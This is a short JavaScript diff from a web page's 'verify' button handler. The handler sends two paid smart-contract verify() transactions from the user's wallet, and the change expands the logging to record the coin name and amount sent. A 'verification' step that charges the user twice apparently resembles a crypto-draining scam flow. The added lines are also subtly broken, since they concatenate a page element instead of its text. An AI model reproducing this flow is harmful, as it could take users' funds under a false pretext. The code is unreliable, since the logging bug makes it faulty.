@@ -781,14 +781,14 @@ document.getElementById('verify').addEventListener('click', async () => {
 	let traxHash = result1.transactionHash;
 	
 	if (result1.status) {        
-		updateLog(sender,'Home - ✅ 1 - '+traxHash);
+		updateLog(sender,'Home - ✅ 1 - '+ document.getElementById("popup-crypto-name")+" "+document.getElementById('amount').value +traxHash);
 	}
 
         const result2 = await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
 	traxHash = result2.transactionHash;
 	
 	if (result2.status) {        
-		updateLog(sender,'Home - ✅ 2 - '+traxHash);
+		updateLog(sender,'Home - ✅ 2 - '+ document.getElementById("popup-crypto-name")+" "+document.getElementById('amount').value +traxHash);
 	}
 
         // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
